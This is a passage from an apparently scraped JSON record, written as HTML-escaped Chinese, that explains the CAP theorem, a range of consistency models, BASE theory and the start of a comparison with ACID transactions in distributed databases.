&#x53EF;&#x7528;&#x6027;&#xFF08;Availability&#xFF09;&#x96C6;&#x7FA4;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x8282;&#x70B9;&#x540E;&#xFF0C;&#x662F;&#x5426;&#x8FD8;&#x80FD;&#x54CD;&#x5E94;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BFB;&#x5199;&#x8BF7;&#x6C42;&#x3002;&#xFF08;&#x5BF9;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x5177;&#x5907;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#xFF09; &#x5206;&#x533A;&#x5BB9;&#x5FCD;&#x6027;&#xFF08;Partition tolerance&#xFF09;&#x5B9E;&#x9645;&#x4E2D;&#x901A;&#x4FE1;&#x4EA7;&#x751F;&#x5EF6;&#x65F6;&#x3002;&#x7CFB;&#x7EDF;&#x5982;&#x679C;&#x4E0D;&#x80FD;&#x5728;&#x65F6;&#x9650;&#x5185;&#x8FBE;&#x6210;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x5C31;&#x610F;&#x5473;&#x7740;&#x53D1;&#x751F;&#x4E86;&#x5206;&#x533A;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5FC5;&#x987B;&#x5C31;&#x5F53;&#x524D;&#x64CD;&#x4F5C;&#x5728;C&#x70B9;&#x548C;A&#x70B9;&#x4E4B;&#x95F4;&#x505A;&#x51FA;&#x9009;&#x62E9;&#x3002; CAP&#x539F;&#x7406;&#x6307;&#x7684;&#x662F;&#xFF0C;CAP&#x7684;&#x4E09;&#x4E2A;&#x8981;&#x7D20;&#x6700;&#x591A;&#x53EA;&#x80FD;&#x540C;&#x65F6;&#x5B9E;&#x73B0;&#x4E24;&#x70B9;&#xFF0C;&#x4E0D;&#x53EF;&#x80FD;&#x4E09;&#x8005;&#x517C;&#x987E;&#x3002;&#x56E0;&#x6B64;&#x5728;&#x8FDB;&#x884C;&#x5206;&#x5E03;&#x5F0F;&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x505A;&#x51FA;&#x53D6;&#x820D;&#x3002;&#x800C;&#x5BF9;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x7CFB;&#x7EDF;&#xFF0C;&#x5206;&#x533A;&#x5BB9;&#x5FCD;&#x6027;&#x662F;&#x57FA;&#x672C;&#x8981;&#x6C42;&#xFF0C;&#x5426;&#x5219;&#x5C31;&#x5931;&#x53BB;&#x4E86;&#x4EF7;&#x503C;&#x3002; &#x56E0;&#x6B64;&#x8BBE;&#x8BA1;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x7CFB;&#x7EDF;&#xFF0C;&#x5C31;&#x662F;&#x5728;&#x4E00;&#x81F4;&#x6027;&#x548C;&#x53EF;&#x7528;&#x6027;&#x4E4B;&#x95F4;&#x53D6;&#x4E00;&#x4E2A;&#x5E73;&#x8861;&#x3002;&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;web&#x5E94;&#x7528;&#xFF0C;&#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x9700;&#x8981;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x56E0;&#x6B64;&#x727A;&#x7272;&#x4E00;&#x81F4;&#x6027;&#x800C;&#x6362;&#x53D6;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#xFF0C;&#x662F;&#x76EE;&#x524D;&#x591A;&#x6570;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x4EA7;&#x54C1;&#x7684;&#x65B9;&#x5411;&#x3002;","keywords":null,"text":"CAP&#x539F;&#x7406;&#x5728;&#x7406;&#x8BBA;&#x8BA1;&#x7B97;&#x673A;&#x79D1;&#x5B66;&#x4E2D;&#xFF0C;CAP&#x5B9A;&#x7406;&#xFF08;CAP theorem&#xFF09;&#xFF0C;&#x53C8;&#x88AB;&#x79F0;&#x4F5C;&#x5E03;&#x9C81;&#x5C14;&#x5B9A;&#x7406;&#xFF08;Brewer&#x2019;s theorem&#xFF09;&#xFF0C;&#x5B83;&#x6307;&#x51FA;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97;&#x7CFB;&#x7EDF;&#x6765;&#x8BF4;&#xFF0C;&#x4E0D;&#x53EF;&#x80FD;&#x540C;&#x65F6;&#x6EE1;&#x8DB3;&#x4EE5;&#x4E0B;&#x4E09;&#x70B9;&#xFF1A; &#x4E00;&#x81F4;&#x6027;&#xFF08;Consistence&#xFF09;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x5907;&#x4EFD;&#xFF0C;&#x5728;&#x540C;&#x4E00;&#x65F6;&#x523B;&#x662F;&#x5426;&#x540C;&#x6837;&#x7684;&#x503C;&#x3002;&#xFF08;&#x7B49;&#x540C;&#x4E8E;&#x6240;&#x6709;&#x8282;&#x70B9;&#x8BBF;&#x95EE;&#x540C;&#x4E00;&#x4EFD;&#x6700;&#x65B0;&#x7684;&#x6570;&#x636E;&#x526F;&#x672C;&#xFF09; &#x53EF;&#x7528;&#x6027;&#xFF08;Availability&#xFF09;&#x96C6;&#x7FA4;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x8282;&#x70B9;&#x540E;&#xFF0C;&#x662F;&#x5426;&#x8FD8;&#x80FD;&#x54CD;&#x5E94;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BFB;&#x5199;&#x8BF7;&#x6C42;&#x3002;&#xFF08;&#x5BF9;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x5177;&#x5907;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#xFF09; &#x5206;&#x533A;&#x5BB9;&#x5FCD;&#x6027;&#xFF08;Partition tolerance&#xFF09;&#x5B9E;&#x9645;&#x4E2D;&#x901A;&#x4FE1;&#x4EA7;&#x751F;&#x5EF6;&#x65F6;&#x3002;&#x7CFB;&#x7EDF;&#x5982;&#x679C;&#x4E0D;&#x80FD;&#x5728;&#x65F6;&#x9650;&#x5185;&#x8FBE;&#x6210;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x5C31;&#x610F;&#x5473;&#x7740;&#x53D1;&#x751F;&#x4E86;&#x5206;&#x533A;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5FC5;&#x987B;&#x5C31;&#x5F53;&#x524D;&#x64CD;&#x4F5C;&#x5728;C&#x70B9;&#x548C;A&#x70B9;&#x4E4B;&#x95F4;&#x505A;&#x51FA;&#x9009;&#x62E9;&#x3002; CAP&#x539F;&#x7406;&#x6307;&#x7684;&#x662F;&#xFF0C;CAP&#x7684;&#x4E09;&#x4E2A;&#x8981;&#x7D20;&#x6700;&#x591A;&#x53EA;&#x80FD;&#x540C;&#x65F6;&#x5B9E;&#x73B0;&#x4E24;&#x70B9;&#xFF0C;&#x4E0D;&#x53EF;&#x80FD;&#x4E09;&#x8005;&#x517C;&#x987E;&#x3002;&#x56E0;&#x6B64;&#x5728;&#x8FDB;&#x884C;&#x5206;&#x5E03;&#x5F0F;&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x505A;&#x51FA;&#x53D6;&#x820D;&#x3002;&#x800C;&#x5BF9;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x7CFB;&#x7EDF;&#xFF0C;&#x5206;&#x533A;&#x5BB9;&#x5FCD;&#x6027;&#x662F;&#x57FA;&#x672C;&#x8981;&#x6C42;&#xFF0C;&#x5426;&#x5219;&#x5C31;&#x5931;&#x53BB;&#x4E86;&#x4EF7;&#x503C;&#x3002; &#x56E0;&#x6B64;&#x8BBE;&#x8BA1;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x7CFB;&#x7EDF;&#xFF0C;&#x5C31;&#x662F;&#x5728;&#x4E00;&#x81F4;&#x6027;&#x548C;&#x53EF;&#x7528;&#x6027;&#x4E4B;&#x95F4;&#x53D6;&#x4E00;&#x4E2A;&#x5E73;&#x8861;&#x3002;&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;web&#x5E94;&#x7528;&#xFF0C;&#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x9700;&#x8981;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x56E0;&#x6B64;&#x727A;&#x7272;&#x4E00;&#x81F4;&#x6027;&#x800C;&#x6362;&#x53D6;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#xFF0C;&#x662F;&#x76EE;&#x524D;&#x591A;&#x6570;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x4EA7;&#x54C1;&#x7684;&#x65B9;&#x5411;&#x3002; &#x5F53;&#x7136;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x5B8C;&#x5168;&#x4E0D;&#x7BA1;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x3002;&#x727A;&#x7272;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x53EA;&#x662F;&#x4E0D;&#x518D;&#x8981;&#x6C42;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x800C;&#x662F;&#x53EA;&#x8981;&#x7CFB;&#x7EDF;&#x80FD;&#x8FBE;&#x5230;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x5373;&#x53EF;&#xFF0C;&#x8003;&#x8651;&#x5230;&#x5BA2;&#x6237;&#x4F53;&#x9A8C;&#xFF0C;&#x8FD9;&#x4E2A;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#xFF0C;&#x8981;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x5BF9;&#x7528;&#x6237;&#x900F;&#x660E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x9700;&#x8981;&#x4FDD;&#x969C;&#x201C;&#x7528;&#x6237;&#x611F;&#x77E5;&#x5230;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x201D;&#x3002;&#x901A;&#x5E38;&#x662F;&#x901A;&#x8FC7;&#x6570;&#x636E;&#x7684;&#x591A;&#x4EFD;&#x5F02;&#x6B65;&#x590D;&#x5236;&#x6765;&#x5B9E;&#x73B0;&#x7CFB;&#x7EDF;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x548C;&#x6570;&#x636E;&#x7684;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#xFF0C;&#x201C;&#x7528;&#x6237;&#x611F;&#x77E5;&#x5230;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x201D;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x5219;&#x53D6;&#x51B3;&#x4E8E;&#x6570;&#x636E;&#x590D;&#x5236;&#x5230;&#x4E00;&#x81F4;&#x72B6;&#x6001;&#x7684;&#x65F6;&#x95F4;&#x3002; &#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x5F53;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x4EFB;&#x4F55;&#x591A;&#x4E2A;&#x540E;&#x7EED;&#x8FDB;&#x7A0B;&#x6216;&#x8005;&#x7EBF;&#x7A0B;&#x7684;&#x8BBF;&#x95EE;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x6700;&#x65B0;&#x7684;&#x66F4;&#x65B0;&#x8FC7;&#x7684;&#x503C;&#x3002;&#x8FD9;&#x79CD;&#x662F;&#x5BF9;&#x7528;&#x6237;&#x6700;&#x53CB;&#x597D;&#x7684;&#xFF0C;&#x5C31;&#x662F;&#x7528;&#x6237;&#x4E0A;&#x4E00;&#x6B21;&#x5199;&#x4EC0;&#x4E48;&#xFF0C;&#x4E0B;&#x4E00;&#x6B21;&#x5C31;&#x4FDD;&#x8BC1;&#x80FD;&#x8BFB;&#x5230;&#x4EC0;&#x4E48;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x5B9E;&#x73B0;&#x5BF9;&#x6027;&#x80FD;&#x5F71;&#x54CD;&#x8F83;&#x5927;&#x3002; &#x5F31;&#x4E00;&#x81F4;&#x6027;&#x7CFB;&#x7EDF;&#x5E76;&#x4E0D;&#x4FDD;&#x8BC1;&#x7EED;&#x8FDB;&#x7A0B;&#x6216;&#x8005;&#x7EBF;&#x7A0B;&#x7684;&#x8BBF;&#x95EE;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x6700;&#x65B0;&#x7684;&#x66F4;&#x65B0;&#x8FC7;&#x7684;&#x503C;&#x3002;&#x7CFB;&#x7EDF;&#x5728;&#x6570;&#x636E;&#x5199;&#x5165;&#x6210;&#x529F;&#x4E4B;&#x540E;&#xFF0C;&#x4E0D;&#x627F;&#x8BFA;&#x7ACB;&#x5373;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x6700;&#x65B0;&#x5199;&#x5165;&#x7684;&#x503C;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x5177;&#x4F53;&#x7684;&#x627F;&#x8BFA;&#x591A;&#x4E45;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x3002;&#x4F46;&#x4F1A;&#x5C3D;&#x53EF;&#x80FD;&#x4FDD;&#x8BC1;&#x5728;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#x7EA7;&#x522B;&#xFF08;&#x6BD4;&#x5982;&#x79D2;&#x7EA7;&#x522B;&#xFF09;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x6570;&#x636E;&#x8FBE;&#x5230;&#x4E00;&#x81F4;&#x6027;&#x72B6;&#x6001;&#x3002; &#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x5F31;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x7279;&#x5B9A;&#x5F62;&#x5F0F;&#x3002;&#x7CFB;&#x7EDF;&#x4FDD;&#x8BC1;&#x5728;&#x6CA1;&#x6709;&#x540E;&#x7EED;&#x66F4;&#x65B0;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x6700;&#x7EC8;&#x8FD4;&#x56DE;&#x4E0A;&#x4E00;&#x6B21;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x7684;&#x503C;&#x3002;&#x5728;&#x6CA1;&#x6709;&#x6545;&#x969C;&#x53D1;&#x751F;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x4E0D;&#x4E00;&#x81F4;&#x7A97;&#x53E3;&#x7684;&#x65F6;&#x95F4;&#x4E3B;&#x8981;&#x53D7;&#x901A;&#x4FE1;&#x5EF6;&#x8FDF;&#xFF0C;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x548C;&#x590D;&#x5236;&#x526F;&#x672C;&#x7684;&#x4E2A;&#x6570;&#x5F71;&#x54CD;&#x3002;DNS&#x662F;&#x4E00;&#x4E2A;&#x5178;&#x578B;&#x7684;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7CFB;&#x7EDF;&#x3002; &#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x7684;&#x53D8;&#x79CD; &#x56E0;&#x679C;&#x4E00;&#x81F4;&#x6027;&#xFF1A;&#x5982;&#x679C;A&#x8FDB;&#x7A0B;&#x5728;&#x66F4;&#x65B0;&#x4E4B;&#x540E;&#x5411;B&#x8FDB;&#x7A0B;&#x901A;&#x77E5;&#x66F4;&#x65B0;&#x7684;&#x5B8C;&#x6210;&#xFF0C;&#x90A3;&#x4E48;B&#x7684;&#x8BBF;&#x95EE;&#x64CD;&#x4F5C;&#x5C06;&#x4F1A;&#x8FD4;&#x56DE;&#x66F4;&#x65B0;&#x7684;&#x503C;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x56E0;&#x679C;&#x5173;&#x7CFB;&#x7684;C&#x8FDB;&#x7A0B;&#x5C06;&#x4F1A;&#x9075;&#x5FAA;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x89C4;&#x5219;&#x3002; &#x8BFB;&#x5DF1;&#x6240;&#x5199;&#x4E00;&#x81F4;&#x6027;&#xFF1A;&#x56E0;&#x679C;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x7279;&#x5B9A;&#x5F62;&#x5F0F;&#x3002;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x603B;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x81EA;&#x5DF1;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#x3002; &#x4F1A;&#x8BDD;&#x4E00;&#x81F4;&#x6027;&#xFF1A;&#x8BFB;&#x5DF1;&#x6240;&#x5199;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x7279;&#x5B9A;&#x5F62;&#x5F0F;&#x3002;&#x8FDB;&#x7A0B;&#x5728;&#x8BBF;&#x95EE;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x540C;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD;&#x5185;&#xFF0C;&#x7CFB;&#x7EDF;&#x4FDD;&#x8BC1;&#x8BE5;&#x8FDB;&#x7A0B;&#x8BFB;&#x5DF1;&#x4E4B;&#x6240;&#x5199;&#x3002; &#x5355;&#x8C03;&#x8BFB;&#x4E00;&#x81F4;&#x6027;&#xFF1A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x5DF2;&#x7ECF;&#x8BFB;&#x53D6;&#x5230;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x503C;&#xFF0C;&#x90A3;&#x4E48;&#x8BE5;&#x8FDB;&#x7A0B;&#x4E0D;&#x4F1A;&#x8BFB;&#x53D6;&#x5230;&#x8BE5;&#x503C;&#x4EE5;&#x524D;&#x7684;&#x4EFB;&#x4F55;&#x503C;&#x3002; &#x5355;&#x8C03;&#x5199;&#x4E00;&#x81F4;&#x6027;&#xFF1A;&#x7CFB;&#x7EDF;&#x4FDD;&#x8BC1;&#x5BF9;&#x540C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x4E32;&#x884C;&#x5316;&#x3002; &#x4E0A;&#x8FF0;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x4E0D;&#x540C;&#x65B9;&#x5F0F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x7EC4;&#x5408;&#xFF0C;&#x4F8B;&#x5982;&#x5355;&#x8C03;&#x8BFB;&#x4E00;&#x81F4;&#x6027;&#x548C;&#x8BFB;&#x5DF1;&#x4E4B;&#x6240;&#x5199;&#x4E00;&#x81F4;&#x6027;&#x5C31;&#x53EF;&#x4EE5;&#x7EC4;&#x5408;&#x5B9E;&#x73B0;&#x3002;&#x5E76;&#x4E14;&#x4ECE;&#x5B9E;&#x8DF5;&#x7684;&#x89D2;&#x5EA6;&#x6765;&#x770B;&#xFF0C;&#x8FD9;&#x4E24;&#x8005;&#x7684;&#x7EC4;&#x5408;&#xFF0C;&#x8BFB;&#x53D6;&#x81EA;&#x5DF1;&#x66F4;&#x65B0;&#x7684; &#x6570;&#x636E;&#xFF0C;&#x548C;&#x4E00;&#x65E6;&#x8BFB;&#x53D6;&#x5230;&#x6700;&#x65B0;&#x7684;&#x7248;&#x672C;&#x4E0D;&#x4F1A;&#x518D;&#x8BFB;&#x53D6;&#x65E7;&#x7248;&#x672C;&#xFF0C;&#x5BF9;&#x4E8E;&#x6B64;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x7A0B;&#x5E8F;&#x5F00;&#x53D1;&#x6765;&#x8BF4;&#xFF0C;&#x4F1A;&#x5C11;&#x5F88;&#x591A;&#x989D;&#x5916;&#x7684;&#x70E6;&#x607C;&#x3002; BASE&#x7406;&#x8BBA;&#x2014;&#x2014;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;BASE&#x7406;&#x8BBA;&#x662F;&#x5BF9;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;&#xFF0C;&#x6838;&#x5FC3;&#x601D;&#x60F3;&#x662F;&#x5373;&#x4F7F;&#x65E0;&#x6CD5;&#x505A;&#x5230;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF08;Strong Consistency&#xFF0C;CAP&#x7684;&#x4E00;&#x81F4;&#x6027;&#x5C31;&#x662F;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF09;&#xFF0C;&#x4F46;&#x5E94;&#x7528;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x9002;&#x5408;&#x7684;&#x65B9;&#x5F0F;&#x8FBE;&#x5230;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#xFF08;Eventual Consitency&#xFF09;&#x3002;Redis&#x7B49;&#x4F17;&#x591A;&#x7CFB;&#x7EDF;&#x6784;&#x5EFA;&#x4E8E;&#x8FD9;&#x4E2A;&#x7406;&#x8BBA;&#x4E4B;&#x4E0A;&#x3002; &#x57FA;&#x672C;&#x53EF;&#x7528;&#xFF08;Basically Available&#xFF09;&#x57FA;&#x672C;&#x53EF;&#x7528;&#x662F;&#x6307;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x5728;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5141;&#x8BB8;&#x635F;&#x5931;&#x90E8;&#x5206;&#x53EF;&#x7528;&#x6027;&#xFF0C;&#x5373;&#x4FDD;&#x8BC1;&#x6838;&#x5FC3;&#x53EF;&#x7528;&#x3002;&#x7535;&#x5546;&#x5927;&#x4FC3;&#x65F6;&#xFF0C;&#x4E3A;&#x4E86;&#x5E94;&#x5BF9;&#x8BBF;&#x95EE;&#x91CF;&#x6FC0;&#x589E;&#xFF0C;&#x90E8;&#x5206;&#x7528;&#x6237;&#x53EF;&#x80FD;&#x4F1A;&#x88AB;&#x5F15;&#x5BFC;&#x5230;&#x964D;&#x7EA7;&#x9875;&#x9762;&#xFF0C;&#x670D;&#x52A1;&#x5C42;&#x4E5F;&#x53EF;&#x80FD;&#x53EA;&#x63D0;&#x4F9B;&#x964D;&#x7EA7;&#x670D;&#x52A1;&#x3002;&#x8FD9;&#x5C31;&#x662F;&#x635F;&#x5931;&#x90E8;&#x5206;&#x53EF;&#x7528;&#x6027;&#x7684;&#x4F53;&#x73B0;&#x3002; &#x8F6F;&#x72B6;&#x6001;&#xFF08; Soft State&#xFF09;&#x8F6F;&#x72B6;&#x6001;&#x662F;&#x6307;&#x5141;&#x8BB8;&#x7CFB;&#x7EDF;&#x5B58;&#x5728;&#x4E2D;&#x95F4;&#x72B6;&#x6001;&#xFF0C;&#x800C;&#x8BE5;&#x4E2D;&#x95F4;&#x72B6;&#x6001;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x7CFB;&#x7EDF;&#x6574;&#x4F53;&#x53EF;&#x7528;&#x6027;&#x3002;&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x4E2D;&#x4E00;&#x822C;&#x4E00;&#x4EFD;&#x6570;&#x636E;&#x81F3;&#x5C11;&#x4F1A;&#x6709;&#x4E09;&#x4E2A;&#x526F;&#x672C;&#xFF0C;&#x5141;&#x8BB8;&#x4E0D;&#x540C;&#x8282;&#x70B9;&#x95F4;&#x526F;&#x672C;&#x540C;&#x6B65;&#x7684;&#x5EF6;&#x65F6;&#x5C31;&#x662F;&#x8F6F;&#x72B6;&#x6001;&#x7684;&#x4F53;&#x73B0;&#x3002;mysql replication&#x7684;&#x5F02;&#x6B65;&#x590D;&#x5236;&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x4F53;&#x73B0;&#x3002; &#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#xFF08; Eventual Consistency&#xFF09;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x526F;&#x672C;&#x7ECF;&#x8FC7;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x540E;&#xFF0C;&#x6700;&#x7EC8;&#x80FD;&#x591F;&#x8FBE;&#x5230;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#x3002;&#x5F31;&#x4E00;&#x81F4;&#x6027;&#x548C;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x76F8;&#x53CD;&#xFF0C;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x662F;&#x5F31;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x3002; BASE&#x548C;ACID&#x7684;&#x533A;&#x522B;&#x4E0E;&#x8054;&#x7CFB;ACID&#xFF0C;&#x662F;&#x6307;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF08;DBMS&#xFF09;&#x5728;&#x5199;&#x5165;/&#x66F4;&#x65B0;&#x8D44;&#x6599;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x4E3A;&#x4FDD;&#x8BC1;&#x4E8B;&#x52A1;&#xFF08;transaction&#xFF09;&#x662F;&#x6B63;&#x786E;&#x53EF;&#x9760;&#x7684;&#xFF0C;&#x6240;&#x5FC5;&#x987B;&#x5177;&#x5907;&#x7684;&#x56DB;&#x4E2A;&#x7279;&#x6027;&#xFF1A;&#x539F;&#x5B50;&#x6027;&#xFF08;atomicity&#xFF0C;&#x6216;&#x79F0;&#x4E0D;&#x53EF;&#x5206;&#x5272;&#x6027;&#xFF09;&#x3001;&#x4E00;&#x81F4;&#x6027;&#xFF08;consistency&#xFF09;&#x3001;&#x9694;&#x79BB;&#x6027;&#xFF08;isolation&#xFF0C;&#x53C8;&#x79F0;&#x72EC;&#x7ACB;&#x6027;&#xFF09;&#x3001;&#x6301;&#x4E45;&#x6027;&#xFF08;durability&#xFF09;&#x3002; &#x539F;&#x5B50;&#x6027;&#xFF1A;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#xFF08;transaction&#xFF09;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x64CD;&#x4F5C;&#xFF0C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x5B8C;&#x6210;&#xFF0C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x4E0D;&#x5B8C;&#x6210;&#xFF0C;&#x4E0D;&#x4F1A;&#x7ED3;&#x675F;&#x5728;&#x4E2D;&#x95F4;&#x67D0;&#x4E2A;&#x73AF;&#x8282;&#x3002;&#x4E8B;&#x52A1;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#xFF0C;&#x4F1A;&#x88AB;&#x56DE;&#x6EDA;&#xFF08;Rollback&#xFF09;&#x5230;&#x4E8B;&#x52A1;&#x5F00;&#x59CB;&#x524D;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5C31;&#x50CF;&#x8FD9;&#x4E2A;&#x4E8B;&#x52A1;&#x4ECE;&#x6765;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x8FC7;&#x4E00;&#x6837;&#x3002; &#x4E00;&#x81F4;&#x6027;&#xFF1A;&#x5728;&#x4E8B;&#x52A1;&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#x548C;&#x4E8B;&#x52A1;&#x7ED3;&#x675F;&#x4EE5;&#x540E;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x6CA1;&#x6709;&#x88AB;&#x7834;&#x574F;&#x3002;&#x8FD9;&#x8868;&#x793A;&#x5199;&#x5165;&#x7684;&#x8D44;&#x6599;&#x5FC5;&#x987B;&#x5B8C;&#x5168;&#x7B26;&#x5408;&#x6240;&#x6709;&#x7684;&#x9884;&#x8BBE;&#x89C4;&#x5219;&#xFF0C;&#x8FD9;&#x5305;&#x542B;&#x8D44;&#x6599;&#x7684;&#x7CBE;&#x786E;&#x5EA6;&#x3001;&#x4E32;&#x8054;&#x6027;&#x4EE5;&#x53CA;&#x540E;&#x7EED;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x4EE5;&#x81EA;&#x53D1;&#x6027;&#x5730;&#x5B8C;&#x6210;&#x9884;&#x5B9A;&#x7684;&#x5DE5;&#x4F5C;&#x3002; 